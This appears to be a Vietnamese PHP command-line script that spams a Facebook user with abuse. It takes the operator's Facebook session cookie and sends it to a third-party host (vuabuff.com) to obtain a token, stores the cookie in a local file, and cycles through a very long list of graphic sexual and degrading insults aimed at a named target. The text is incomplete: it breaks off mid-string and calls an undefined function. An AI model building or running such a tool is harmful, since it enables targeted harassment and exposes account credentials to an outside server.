<?php
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
$cyan= "\e[1;36m";
/***[ Đánh Dấu Bản Quyền ]***/
$thanh_xau= $trang."~".$do."[".$luc."🐑".$do."] ".$trang."➩ ";
$thanh_dep= $trang."~".$do."[".$luc."🐑".$do."] ".$trang."➩ ";
$thanh = $trang."➩ ";
$vinh = $trang."\033[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
$ip = file_get_contents("https://vtoolvip.tk/ip.php");
$useragent = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
$_SESSION['US_SPAM_MESS'] = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36";

/***[ Time ]***/
$today= date('d-m-y');
$a = date("d"); 
$b = date("m"); 
$c = date("Y");
$ngay = date("d"); 
$thang = date("m"); 
$nam = date("Y");
$day= date('d-m-y');
$d = date("d-m");
$weekday = date("l");
/***[ Banner ]***/
$thuong = $do."[".$luc."∆".$do."]".$trang." ➡️ ";
$thanhngang = $vang."-------------------------------------------------------------\n";
$weekday = date("l"); 
$ngay = date("d"); 
$thang = date("m"); 
$nam = date("Y"); 
$weekday = strtolower($weekday);switch($weekday) { case 'monday': $weekday = "\033[1;33mThứ\033[1;36m 2"; break; case 'tuesday': $weekday = "\033[1;33mThứ\033[1;36m 3"; break; case 'wednesday': $weekday = "\033[1;33mThứ \033[1;36m4"; break; case 'thursday': $weekday = "\033[1;33mThứ \033[1;36m5"; break; case 'friday': $weekday = "\033[1;33mThứ\033[1;36m 6"; break; case 'saturday': $weekday = "\033[1;33mThứ \033[1;36m7"; break; default: $weekday = "\033[1;33mCN"; break; }
$banner = "\033[1;31m────\033[1;31────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\033[1;31m────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────
\033[1;33m
       _____                       _          
       \_   \_ __ ___  _ __  _   _| |___  ___ 
        / /\/ '_ ` _ \| '_ \| | | | / __|/ _ \
     /\/ /_ | | | | | | |_) | |_| | \__ \  __/
     \____/ |_| |_| |_| .__/ \__,_|_|___/\___|
                      |_|    

\033[1;31m────\033[1;31────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\033[1;31m────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────
\033[1;31m        🐳𝐈𝐧𝐟𝐨 𝐀𝐝𝐦𝐢𝐧🐳
\033[1;32m>👀 𝐓𝐞̂𝐧: 𝑵𝒈𝒖𝒚𝒆̂̃𝒏 𝑻𝒊𝒆̂́𝒏 𝑫𝒂̣𝒕
\033[1;33m>💮 𝐁𝐢𝐞̣̂𝐭 𝐃𝐚𝐧𝐡: Tiến Đạt ( Ẩn Danh )
\033[1;34m>👤 𝐆𝐢𝐨̛́𝐢 𝐭𝐢́𝐧𝐡: 𝗡𝗮𝗺
\033[1;35m>💫 𝐂𝐡𝐢𝐞̂̀𝐮 𝐜𝐚𝐨 𝐯𝐚̀ 𝐜𝐚̂𝐧 𝐧𝐚̣̆𝐧𝐠: 𝟏𝐦62 -50kg
\033[1;36m>💘 𝐌𝐨̂́𝐢 𝐪𝐮𝐚𝐧 𝐡𝐞̣̂: Chx
\033[1;37m>🌎 𝐐𝐮𝐞̂ 𝐪𝐮𝐚́𝐧: 𝐻𝑎̀ 𝑁𝑜̣̂𝑖
\033[1;31m>👫 𝐆𝐮: ĐÉO 
\033[1;35m>🌸 𝐓𝐢́𝐧𝐡 𝐜𝐚́𝐜𝐡: 𝐍𝐡𝐚̂𝐲,𝐪𝐮𝐚̣̂𝐲 𝐧𝐡𝐮̛𝐧𝐠 𝐦𝐚̀ 𝐳𝐮𝐢 𝐭𝐢́𝐧𝐡 :>>
\033[1;33m>🌀 𝐒𝐨̛̉ 𝐭𝐡𝐢́𝐜𝐡: 𝐓𝐡𝐢́𝐜𝐡 𝐩𝐡𝐚́, 𝐚̆𝐧 𝐮𝐨̂́𝐧𝐠
\033[1;32m>☎ 𝑺𝑫𝑻: 0395988143
\033[1;36m>📨𝐸𝑚𝑎𝑖𝑙 : 𝐝𝐚𝐭𝐳𝐤𝟐𝟓@𝐠𝐦𝐚𝐢𝐥.𝐜𝐨𝐦
\033[1;31m>𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌: https://www.facebook.com/datzk25
\033[1;37m               HOTWAR:4.0
\033[1;31m────\033[1;31────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\033[1;31m────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────
\033[1;33m>Tiến Đạt Mãi Yêu Các Em Nhoaa 🌹💕
\033[1;31m────\033[1;31────\033[1;32m────\033[1;33m────\033[1;31m────\033[1;35m────\033[1;36m────\033[1;37m────\033[1;31m────\033[1;32m────\033[1;33m────\033[1;34m────\033[1;35m────\033[1;36m────\033[1;37m────\n";
/***[ Clear + Thông Số Admin ]***/
    while(true){
   system('clear');
   echo $banner;
        if(file_exists("cuudethuong.txt")){
            system('clear');
            echo $banner;
            echo $thanh_dep.$vang."Nhập ".$hong."[".$trang."1".$hong."]".$do." Sử Dụng Cookie Cũ\n";
            echo $thanh_dep.$vang."Nhập ".$hong."[".$trang."2".$hong."]".$do." Sử Dụng Cookie Mới\n";
            echo $thanh_dep.$luc."Nhập số: " . $vang;
            $_SESSION['nhapcc'] = trim(fgets(STDIN));
         if ($_SESSION['nhapcc'] == 1){
         	echo $vang."Đang Nhập Dữ Liệu . . .🌹\n";
         	sleep(2);
         	break;
         } else {
                unlink("cuudethuong.txt");
            }
        } else {
        echo $thanh_dep.$luc."Nhập Cookie Facebook: ".$vang;
        $_SESSION['CK_SPAM_MESS'] = trim(fgets(STDIN));        
		$token_me =  file_get_contents("https://vuabuff.com/api/token/EAAG.php?cookie=".urlencode($_SESSION['CK_SPAM_MESS'])."&2fa=".$haifa);
        $k = fopen("cuudethuong.txt","w+");
        fwrite($k, $_SESSION['CK_SPAM_MESS']."\n".$_SESSION['US_SPAM_MESS']);
        fclose($k);
        break;
        }
    }

    system('clear');
    echo $banner;
    $read = file("cuudethuong.txt",FILE_IGNORE_NEW_LINES);
    $_SESSION['CK_SPAM_MESS'] = $read[0];
    $_SESSION['US_SPAM_MESS'] = $read[1];
    $_SESSION['HD_SPAM_MESS'] = array(
        "Cookie:".$_SESSION['CK_SPAM_MESS'],
        "Host:mbasic.facebook.com",
        "user-agent:".$_SESSION['US_SPAM_MESS'],
        "sec-fetch-site:same-origin",
        "sec-fetch-mode:navigate",
        "sec-fetch-user:?1",
        "sec-fetch-dest:document",
        "upgrade-insecure-requests:1");
        fopen("idlink.txt","w+");
    $_SESSION['DATA_SPAM_MESS'] = getallspam($thanh,$thanh_dep, $do, $trang, $luc, $vinh);
    system('clear');
    echo $do."Nhập Tên\n";
    echo $hong."Bỏ Qua: ".$xnhac;
    $va = trim(fgets(STDIN));
    system('clear');
    echo "Nhập delay: ".$vang;
    $delay = trim(fgets(STDIN));
    $sl = 0;
$dungtool = 7000000000000000000000000000000000000;
    system('clear');
    echo $banner;
    $dem=0;
    while(true){   
    $vanh['dz'] = [
    "$va Chào Cha Chx?",
"𝟑𝟎 Đ𝐢𝐞̂̀𝐮 Thầy Hoàng Giáo Sư Đại Học Phản Động dạy các em!
𝟏. 𝐌𝐚̀𝐲 𝐫𝐞𝐠𝐛𝐨𝐱=𝐦𝐚̀𝐲 𝐧𝐮́𝐩
𝟐. 𝐓𝐚𝐨 𝐫𝐞𝐠𝐛𝐨𝐱=𝐭𝐚𝐨 𝐛𝐚́
𝟑. 𝐌𝐚̀𝐲 𝐭𝐚𝐠 𝐧𝐠𝐮̛𝐨̛̀𝐢=𝐦𝐚̀𝐲 𝐬𝐨̛̣
𝟒. 𝐓𝐚𝐨 𝐭𝐚𝐠 𝐧𝐠𝐮̛𝐨̛̀𝐢=𝐦𝐚̀𝐲 𝐬𝐨̛̣
𝟓. 𝐌𝐚̀𝐲 𝐜𝐚̆𝐧𝐠=𝐦𝐚̀𝐲 𝐜𝐚𝐲
𝟔. 𝐓𝐚𝐨 𝐜𝐚̆𝐧𝐠=𝐦𝐚̀𝐲 𝐬𝐨̛̣
𝟕. 𝐌𝐚̀𝐲 𝐜𝐡𝐮̛̉𝐢 𝐭𝐚𝐨=𝐦𝐚̀𝐲 𝐜𝐚𝐲
𝟖. 𝐓𝐚𝐨 𝐜𝐡𝐮̛̉𝐢 𝐦𝐚̀𝐲=𝐦𝐚̀𝐲 𝐜𝐚𝐲
𝟗. 𝐓𝐚𝐨 𝐤𝐢𝐜𝐤 𝐦𝐚̀𝐲=𝐭𝐚𝐨 𝐰𝐢𝐧
𝟏𝟎. 𝐌𝐚̀𝐲 𝐤𝐢𝐜𝐤 𝐭𝐚𝐨=𝐭𝐚𝐨 𝐰𝐢𝐧
𝟏𝟏. 𝐓𝐚𝐨 𝐬𝐩𝐚𝐦=𝐭𝐚𝐨 𝐰𝐢𝐧
𝟏𝟐. 𝐌𝐚̀𝐲 𝐬𝐩𝐚𝐦=𝐛𝐚̣𝐢 𝐭𝐚𝐨
𝟏𝟑. 𝐓𝐚𝐨 𝟏 𝐜𝐡𝐮̛̃=𝐭𝐚𝐨 𝐬𝐚𝐧𝐠
𝟏𝟒. 𝐌𝐚̀𝐲 𝟏 𝐜𝐡𝐮̛̃=𝐦𝐚̀𝐲 𝐩𝐡𝐞̀𝐧
𝟏𝟓. 𝐓𝐚𝐨 𝐧𝐡𝐚̂𝐲=𝐭𝐚𝐨 𝐛𝐚́
𝟏𝟔. 𝐌𝐚̀𝐲 𝐧𝐡𝐚̂𝐲=𝐦𝐚̀𝐲 𝐧𝐠𝐮
𝟏𝟕. 𝐌𝐚̀𝐲 𝐬𝐮̉𝐚 𝐦𝐢𝐜=𝐦𝐚̀𝐲 đ𝐮́
𝟏𝟖. 𝐌𝐚̀𝐲 𝐚̆𝐧 𝐡𝐨̂𝐢=𝐦𝐚̀𝐲 đ𝐮́
𝟏𝟗. 𝐌𝐚̀𝐲 𝐧𝐡𝐚𝐢 𝐧𝐠𝐨̂𝐧 𝐭𝐚𝐨=𝐦𝐚̀𝐲 𝐦𝐨̛́𝐢 𝐧𝐡𝐮́
𝟐𝟎. 𝐌𝐚̀𝐲 𝐜𝐡𝐚̣𝐲 𝐭𝐚𝐨=𝐭𝐚𝐨 𝐰𝐢𝐧
𝟐𝟏. 𝐌𝐚̀𝐲 𝐝𝐢́ 𝐭𝐚𝐨=𝐦𝐚̀𝐲 𝐜𝐚𝐲
𝟐𝟐. 𝐌𝐚̀𝐲 𝐝𝐮̀𝐧𝐠 𝐛𝐨𝐭=𝐦𝐚̀𝐲 𝐜𝐚𝐲
𝟐𝟑. 𝐌𝐚̀𝐲 𝐥𝐚̀𝐦 𝐭𝐡𝐚̂𝐧=𝐭𝐚𝐨 𝐛𝐚́
𝟐𝟒. 𝐌𝐚̀𝐲 𝐩𝐡𝐨̂́𝐭 𝐭𝐚𝐨=𝐦𝐚̀𝐲 𝐜𝐚𝐲
𝟐𝟓. 𝐌𝐚̀𝐲 𝐫𝐞́𝐨 𝐭𝐨𝐩=𝐦𝐚̀𝐲 đ𝐮́
𝟐𝟔. 𝐌𝐚̀𝐲 𝐱𝐮̛𝐧𝐠 𝐝𝐚𝐧𝐡=𝐦𝐚̀𝐲 𝐚̉𝐨
𝟐𝟕. 𝐌𝐚̀𝐲 𝐤𝐡𝐨̂𝐧𝐠 𝐥𝐞̂𝐧=𝐦𝐚̀𝐲 𝐬𝐨̛̣
𝟐𝟖. 𝐌𝐚̀𝐲 𝐛𝐚̣̂𝐭 𝐝𝐮𝐲𝐞̣̂𝐭=𝐦𝐚̀𝐲 𝐬𝐨̛̣
𝟐𝟗. 𝐌𝐚̀𝐲 𝐥𝐚̀𝐦 𝐠𝐢̀ 𝐜𝐮̃𝐧𝐠 𝐭𝐡𝐮𝐚 𝐭𝐚𝐨
𝟑𝟎. 𝐓𝐚𝐨 𝐧𝐨́𝐢 𝐦𝐚̀𝐲 𝐤𝐡𝐨̂𝐧𝐠 𝐧𝐠𝐡𝐞=𝐦𝐚̀𝐲 𝐥𝐨𝐬𝐞𝐫",
"$va Sủa Lên Cha Coi", "$va Cha Đang Ngồi Đụ Mẹ Con Này", "$va Óc Chó Mà Đòi Bem Cha À","Mày Gà Vl $va","Đợi Cha Đang Đụ Mẹ Con Rở Hiệp $va","$va Mẹ Mày Lồn Hơi Rỗng Nha Con","Ê $va Thấy Cha Đụ Mẹ Mày R À Cay Cha Ko","Lêu Lêu Nhìn Cha Đụ Mẹ Mày Ko Làm Được Gì $va Gì À Đừng Có Cay Cha Nha","Lên Trường Chửi Cô Về Nhà Chửi Cha À $va","Quỳ Xuống Xin Cha Đi $va","Cha Còn Tha Cho Chứ Mày Ớt Quá $va","Mày Bất Lực Mà Để Cha Đụ Lòi Hột Le Mà $va"," Ơ Thk Ngu Cay Cha $va À","Bấm Số Gọi Mẹ Mày Về Đi Cho Cha Đụ Nốt $va", "Ngồi Lì Một Chỗ Cho Cha Đụ Mẹ Mày Á$va","Đừng Tưk Cha Nha Con $va","Cố Gắng Rồi Để Cha Đụ Mẹ Mày Tiếp Á $va","Hết Nổi Rồi À Hãy Cản Cha Đụ Mẹ Mày Đi Con $va","Mày Mãi Bại Dưới Tay Cha Mà$va Cay Cha Quá Thì Bảo Câu","Sao Mày Ớt Vậy Trời Ơi $va","Ô Kìa $va","Bem Cha Mạnh Lên Con Yếu Vcl Á $va Cảm Nhận Lỗi Đau Bị Ửa À Con","Bấm Số Cầu Cứu Cha Đi Con $va","Về Nhà Mách Ba Là Tao Đụ Mẹ Con Nha $va","Tao Cho Mày Quyền Mách Cha Mà $va","Mày Tốt Thế Ngồi Nhìn Tao Đụ Mẹ Mày Luôn À $va Của Cha Lên Cha Cho Sờ Bướm Mẹ Mày Này","Con Cay Cha R À $va","Tao Khinh Mày Vcl Con À $va","Tao Chửi Mày Quá Mà $va","Óc $va Bị Chửi Hoá Ngáo CMNR","Mày Var Với Cha Mà Đòi Chạy À $va","Cha Bá MXH Đá Chết Con Đĩ Mẹ Mày Rồi Á$va","Núi Cao Con Có Tao Cao Hơn Mày Mà$va","Mày Chỉ Biết Ngồi Thờ Cúng Ba Mẹ Mày À$va","Sao Mày Mồ Côi Quá Vậy Con $va","Con Thú Xa Cơ Quay Ra Cắn Cha À $va","Bị Cha Chửi Chỉ Biết Ôm Hận Thôi À $va","Bị Tao Chửi Hỏng Mẹ Não Rồi Kkk $va","mẹ Mày Đang Banh Lồn Cho Tao Đụ Nek","Mẹ Mày Gái Ngành Mờ $va","Đừng Chạy Cha Nha Con $va","Cắn Cha Chỉ Có Bại Thoy $va","Nhìn Mày Thảm VCL Ấy $va","Mẹ Mày Banh Háng Cho Khách Đụ Kìa $va","Tao Lỡ Cho Mẹ Mày Bú Cu Tao Rồi Sướng $va","Anh Bá Quá Lên Mày Thủ Dâm Mẹ Mày Rồi À $va","Anh Bá Hơn Mày Mà $va","Mày Bại Anh Mà $va","Gà Đòi Bem Tao À Ku $va","Sao Mày Phèn Như Ba Mày Vậy $va","Mày Chạy = Cha Đụ Mẹ Mày $va","Mày Sợ Tao Đến Vậy À $va","Nhây Đến Khi Đụ Mẹ Mày Lát Bướm Nào $va","$va Bại Anh Đừng Ảo Win Nha","Thằng $va Đần Học Lỏm Của Tao","Mẹ Mày Đi Làm Bị Cha Ép Ra Đụ $va","Ê Ê Đừng Thù Cha Nha $va","Cha Mày Lỡ Lột Quần Áo Mẹ Mày Giữa Đường Cái Rồi HuHu $va","Mày Phèn Dữ Chơi Toàn Chạy $va","Mày Chỉ Biết Ôm hận Cha Thôi À $va","Mày Chỉ Bem Được Mấy Đứa Cấp 1 Thoy $va","Còn Bem Cha Trong Vô Vọng À $va","Óc Than Thở Vì Sao Tao Bá À  $va","Sao Mày Quê Mùa Vậy Thk Mồ Côi $va","Bị Cha Đụ Từ Nam Vào Đến Bắc Mà","Mày Óc Quá Lên Cha Chửi Thông Não Cho $va","Câm À", "Đĩ Mẹ Mày Bị Địt Tê Lồn", "Sủa Mạnh Lên Cha Nghe", "Ba Mày Die Rồi À", "Câm Lặng Rồi Hả", "Hay Rớt Rồi", "Bị Cha Đụ Ná Thở Mà", "Tiến Đạt Bá Mà 🐲", "Còn Mày Phèn Vcl", "Mẹ Mày Bị Cha Đụ Tê Não", "Ẳng Nào Con", "Bố Cân Hết Mẹ", "Tao Địt Mẹ Mày Mà", "Cay Cha Ko", "Tao Bá Vcl", "Sủa Chill Lên", "Chó Sủa Nguu Bảo Cha Rớt 😓", "Con Đĩ Má Mày Die Rồi À", "Tại Cha Đụ Mẹ Mày Die Mà", "R Xong Mẹ Mày Tắt Thở Rồi", "Điếm Êyy", "Cay Đỏ Dái Rồi À", "Bị Tao Giết Cả Họ Nhà Mày Rồi", "Đĩ Má Mày Die Rồi À", "Ôi Má Mày Chết Kệ Má Mày", "Sủa Chill", "Cay Cha Quá À", "Má Mày Câm Nín Rồi À", "Bà Mày Đi Đứng Đường Rồi Kkk", "Sủa Eyy ?", "Ẳng Mạnh Lên", "Con Chó Dốt Cắn Cha", "Con Đĩ Mẹ Mày Êyy", "Tao Chơi Chx Đã Mà", "Kêu Mẹ Mày Qua Cho Tao Đụ Tiếp Đi", "Làm Thân Với Tao À", "Mày Làm Thân Tao Mà", "M Nguu Vcl", "Mẹ Mày Bị Đụ Tắt Thở", "Con Đĩ Béo Êyt", "Sủa Chill", "Mày Câm Rồi À","Tiến Đạt Bá Vcl", "Anh Bá Vcl Lỡ Đá Chết Mẹ mày Rồi ","Anh Bá Quá Mày Sợ Anh Mà","Má Mày Câm Nín Rồi À", "Thk Trẻ Trâu Này", "Sủa Chill Lên", "Cay Cha Quá Rồi À", "Sao Mày Dốt Thế","Học Lỏm Tao Là Giỏi", "Trụ Ko Nổi Nx Rồi À", "Con Chú Sủa Chill Lên ", "Bem Anh Đâu Dễ", "Mày Gà Vcl Ý", "Mày Sợ Tao Mà", "M Gà Mà Học Lỏm Là Giỏi", "Mày Ngu Rõ Ra HaHa", "Cha Cho mày Ngậm Mỏ Chx", "con đĩ ngu bị cha chửi k ngốc đầu lên đc🤣", 
"Tiền Ít Mà Đòi Lồn Thơm À Con Óc Êy $va ",
"Mày Cay Cha Quá À Con Ngu ",
"Mày Phế Như Mẹ Mày Bị Tao Hiếp ",
"Đừng Ngậm Đắng Nuốt Cay Cha Nha Con ",
"Con Chó $va Cay Cha Rõ ",
"Óc Chó Ngồi Đọ Nhây Với Cha ",
"Mẹ Mày Bị Tao Đụ Lên Đỉnh Rồi ",
"Tiến Đạt Bá Chủ All Sàn Mà Em ",
"Thk Ngu Cầm Bot Đú Kè HaHa ",
"Mày Ớt Nắm Rồi Phải Không $va ",
"Mẹ Mày Lồn Thâm V Con Óc ",
"Mẹ Mày Bị Tao Đụ Kêu Tạch Tạch Tạch Phê", 
"Dái Mày Khắm Vậy $va",
"Lũ Đú Phế Như Cái Lồn Óc Đú Nguu Vcl Ý",
"Sủa Hăng Cha Nghe Coi Mày Nín = Mẹ Mày Bị Tao Đụ", 
"Lỗ Bướm Mẹ Mày Rỗng Vãi",
"BỊ TAO Hành Hung Về Mách Mẹ À Lũ Đú",
  "sao m cay t vậy tr🤣🤖",
  "thg óc đú m sủa lẹ đê",
  "cay đến nỗi phải bỏ cha vô hạn chế à:))?",
  "cay cha k con eii",
  "sủa lẹ đi🤣🤣",
  "thg culi ô xin mà đòi đú à",
  "lên bem cha đê🤣🤔",
  "sủa đê🤣",
  "mẹ m bị t đụ kìa🤤🤣",
  "cay k con",
  "mày hài v tr",
  "thg ngu đú bị cha chửi cho ko ngốc đầu lên đc🤣🤣",
  "𝑶̂𝒊 𝑪𝒂́𝒊 Đ𝒊̣𝒕 𝑪𝒐𝒏 𝑮𝒂́𝒊 𝑴𝒆̣ 𝑴𝒂̀𝒚 𝑻𝒉𝒂̆̀𝒏𝒈 𝑵𝒈𝒖 𝑳𝒐̂̀𝒏 𝑻 Đ𝒊̣𝒕 𝑪𝒂̉ 𝑯𝒐̣ 𝑯𝒂̀𝒏𝒈 𝑵𝒉𝒂̀ 𝑴𝒂̀𝒚 Đ𝒂̂́𝒚 𝑴𝒂̀ 𝑴𝒐̛̉ 𝑴𝒊𝒆̣̂𝒏𝒈 𝑹𝒂 Đ𝒐̀𝒊 Đ𝒊̣𝒕 𝑻𝒓𝒐𝒏𝒈 𝑲𝒉𝒊 𝑪𝒐𝒏 𝑪𝒂̣̆𝒄 𝑪𝒐́ Đ𝒂̂̀𝒖 𝑵𝒈𝒐́𝒏 𝑻𝒂𝒚 𝑪𝒉𝒂 𝑵𝒆̂𝒏 𝑵𝒉𝒐̛́ 𝑪𝒉𝒂 𝑳𝒂̀ 𝑩𝒐𝒂𝒛 𝑵𝒆̂𝒏 𝑪𝒂́𝒊 Đ𝒊̣𝒕 𝑪𝒐𝒏 𝑴𝒆̣ 𝑴𝒂̀𝒚 Đ𝒖̛̀𝒏𝒈 𝑯𝒂̆𝒏𝒈 𝑽𝒐̛́𝒊 𝑪𝒉𝒂 𝑲𝒉𝒊 𝑪𝒐𝒏 𝑪𝒐̀𝒏 𝑳𝒂̀ 𝑴𝒐̣̂𝒕 𝑺𝒊𝒏𝒉 𝑳𝒊𝒏𝒉 𝑻𝒉𝒊̀ 𝑪𝒉𝒂 Đ𝒂̃ Đ𝒖̣ 𝑵𝒂́𝒕 𝑳𝒐̂̃ 𝑳𝒐̂̀𝒏 𝑪𝒐𝒏 𝑴𝒆̣ 𝑪𝒐𝒏 𝑹𝒐̂̀𝒊 𝑵𝒆̂𝒏 𝑪𝒐𝒏 𝑺𝒖̉𝒂 𝑻𝒉𝒊̀ 𝑯𝒂̃𝒚 𝑺𝒖𝒚 𝑵𝒈𝒉𝒊̃ 𝑽𝒊̀ 𝑪𝒉𝒂 𝑳𝒐̛̃ 𝑩𝒂̆́𝒏 𝑻𝒊𝒏𝒉 𝑻𝒓𝒖̀𝒏𝒈 𝑽𝒂̀𝒐 𝑵𝒂̃𝒐 𝑪𝒖̉𝒂 𝑪𝒐𝒏 𝑵𝒆̂𝒏 𝑪𝒐𝒏 𝑩𝒊̣ 𝑵𝒈𝒖 𝑪𝒂̣̆𝒄 𝑽𝒂̀ Đ𝒆́𝒐 𝑪𝒐́ 𝑺𝒖𝒚 𝑵𝒈𝒉𝒊̃ Đ𝒖̛𝒐̛̣𝒄 𝑵𝒉𝒖̛̃𝒏𝒈 𝑮𝒊̀ 𝑪𝒐𝒏 Đ𝒂𝒏𝒈 𝑳𝒂̀𝒎 𝑵𝒆̂𝒏 𝑪𝒉𝒂 𝑴𝒐̛́𝒊 𝑩𝒂̉𝒐 𝑪𝒐𝒏 𝑵𝒈𝒖 𝑵𝒉𝒖̛ 𝑪𝒐𝒏 𝑪𝒉𝒐́ 𝑴𝒂̀ 𝑺𝒖̉𝒂 𝑵𝒈𝒖 𝑵𝒖̛̃𝒂 𝑪𝒉𝒖̛́ 𝑪𝒉𝒂 𝑪𝒐̀𝒏 𝑵𝒉𝒐̛́ 𝑪𝒐𝒏 𝑳𝒐𝒂̣𝒏 𝑳𝒖𝒂̂𝒏 𝑽𝒐̛́𝒊 𝑻𝒉𝒂̆̀𝒏𝒈 𝑪𝒉𝒂 𝑴𝒂̀𝒚 𝑴𝒂̀ 𝑴 𝑵𝒖𝒐̂́𝒕 𝑻𝒊𝒏𝒉 𝑻𝒓𝒖̀𝒏𝒈 𝑻𝒉𝒂̆̀𝒏𝒈 𝑮𝒊𝒂̀ 𝑴𝒂̀𝒚 𝑵𝒉𝒖̛ 𝑵𝒖̛𝒐̛́𝒄 𝑺𝒖𝒐̂́𝒊 𝑪𝒉𝒂̆́𝒄 𝑻𝒊𝒏𝒉 𝑻𝒓𝒖̀𝒏𝒈 𝑵𝒐́ 𝑪𝒉𝒖̛́𝒂 𝑺𝒊𝒏𝒉 𝑳𝒊𝒏𝒉 𝑵𝒈𝒖 𝑵𝒆̂𝒏 𝑴𝒂̀𝒚 𝑼𝒐̂́𝒏𝒈 𝑽𝒂̀𝒐 𝑩𝒊̣ 𝑩𝒂̣𝒊 𝑵𝒂̃𝒐 𝑯𝒂̉ 𝑻𝒉𝒖̛́ 𝑪𝒐𝒏 𝑪𝒂̣̆𝒄 𝑪𝒐𝒏 Đ𝒆́𝒐 𝑪𝒐́ 𝑻𝒖𝒐̂̉𝒊 𝑽𝒐̛́𝒊 𝑪𝒉𝒂 𝑵𝒆̂𝒏 Đ𝒖̛̀𝒏𝒈 𝑺𝒐𝒂̣𝒏 𝑵𝒉𝒖̛̃𝒏𝒈 𝑵𝒈𝒐̂𝒏 𝑵𝒈𝒖 𝑴𝒂̀ 𝑹𝒂 𝑽𝒆̉ 𝑻𝒂 Đ𝒂̂𝒚 𝑹𝒐̂̀𝒊 𝑺𝒖̉𝒂 𝑫𝒐̛ 𝑵𝒖̛̃𝒂 𝑵𝒉𝒆́ 𝑪𝒐𝒏 𝑮𝒂́𝒊 𝑴𝒆̣ 𝑴𝒂̀𝒚 𝑩𝒊̣ 𝑻𝑨𝒐 đ𝒊̣𝒕 đ𝒆̂́𝒕 𝑪𝒉𝒆̂́𝒕 𝑻𝒉𝒊̀ 𝑴 𝑪𝑼̃𝒏𝒈 𝑩𝒊̣ 𝑻 đ𝒊̣𝒕 𝑵𝒂́𝒕 𝑴𝒂̀ 𝑻𝒉𝒐̂𝒊 𝑵𝒆̂𝒏 Đ𝒖̛̀𝒏𝒈 𝑩𝒂𝒐 𝑮𝒊𝒐̛̀ 𝑺𝒖̉𝒂 𝑽𝒐̛́𝒊 𝑪𝒉𝒂 𝑵𝒆̂𝒏 𝑵𝒉𝒐̛́ 𝑪𝑯𝑨 𝑳𝑨̀ 𝑩𝑶𝑨𝒁 𝑩𝑶𝑨𝒁 Đ𝑬̣𝑷 𝑻𝑹𝑨𝑰 𝑩𝑶𝑨𝒁 Đ𝑰̣𝑻 𝑵𝑨́𝑻 𝑳𝑶̂̀𝑵 𝑴𝑬̣ 𝑴𝑨̀𝒀 𝑽𝑨̀ 𝑩𝑨̀ 𝑵𝑮𝑶𝑨̣𝑰 𝑴𝑨̀𝒀 𝑽𝑨̀ 𝑴𝑨̀𝒀 𝑳𝑨̀ 𝑻𝑯𝑼̛́ 𝑺𝑼́𝑪 𝑽𝑨̣̂𝑻 Đ𝑬̉ 𝑹𝑨 𝑪𝑯𝑼̛́ Đ𝑬́𝑶 𝑷𝑯𝑨̉𝑰 𝑪𝑶𝑵 𝑵𝑮𝑼̛𝑶̛̀𝑰 Đ𝑬̉ 𝑹𝑨 𝑽𝑰̀ 𝑪𝑶𝑵 𝑴𝑬̣ 𝑴𝑨̀𝒀 𝑳𝑨̀ 𝑺𝑼́𝑪 𝑽𝑨̣̂𝑻 𝑴𝑨̀ 😚😚𝑵𝑬̂𝑵 𝑴𝑨̀𝒀 𝑪𝑼̃𝑵𝑮 𝑵𝑮𝑼 𝑳𝑶̂̀𝑵 𝑵𝑯𝑼̛ 𝑪𝑶𝑵 𝑺𝑼́𝑪 𝑽𝑨̣̂𝑻 𝑮𝑨́𝑰 𝑴𝑬̣ 𝑴𝑨̀𝒀 Đ𝑨̂́𝒀 𝑪𝑶𝑵 𝑪𝑯𝑶́ 𝑵𝑮𝑼 𝑶̛𝑰 Đ𝑰̣𝑻 𝑪𝑶𝑵 𝑴𝑬̣ 𝑴𝑨̀𝒀 Đ𝑼̛̀𝑵𝑮 Đ𝑬̂̉ 𝑪𝑯𝑨 Đ𝑼́𝑪 𝑪𝑶𝑵 𝑪𝒂̣̆𝒄 𝒄𝒉𝒐 𝒌𝒆̣𝒕 𝒄𝒐̂̉ 𝒉𝒐̣𝒏𝒈 𝒄𝒐𝒏 𝒏𝒉𝒆́ 𝒄𝒐𝒏 𝒄𝒉𝒐́ 😚😚❤️😌😁😌😁😌😁😌đ𝒖̛̀𝒏𝒈 𝒄𝒐́ 𝒎𝒂̀ 𝒔𝒖̉𝒂 𝒎𝒐̉ 𝒍𝒐̂̀𝒏 𝒄𝒖̉𝒂 𝒄𝒐𝒏 𝒗𝒐̂ 𝒏𝒄𝒉 𝒗𝒐̛́𝒊 𝒄𝒉𝒂 𝒗𝒊̀ 𝒄𝒐𝒏 đ𝒆́𝒐 đ𝒖̉ 𝒕𝒓𝒊̀𝒏𝒉 đ𝒂̂𝒖 𝒄𝒐𝒏 𝒄𝒉𝒐́ 𝒏𝒈𝒐𝒂𝒏 𝒄𝒖̉𝒂 𝒄𝒉𝒂.𝒏𝒈𝒐𝒂𝒏 𝒕𝒉𝒊̀ 𝒄𝒉𝒂 𝒄𝒉𝒐 2 𝒎𝒆̣ 𝒄𝒐𝒏 𝒄𝒖̉𝒂 𝒄𝒐𝒏 𝒃𝒖́ 𝒄𝒂̣̆𝒄  𝒍𝒂̂́𝒚 𝒕𝒊𝒆̂̀𝒏 𝒔𝒐̂́𝒏𝒈 𝒒𝒖𝒂 𝒏𝒈𝒂̀𝒚 𝒄𝒉𝒖̛́ 𝒄𝒐𝒏 𝒎𝒆̣ 𝒎𝒂̀𝒚 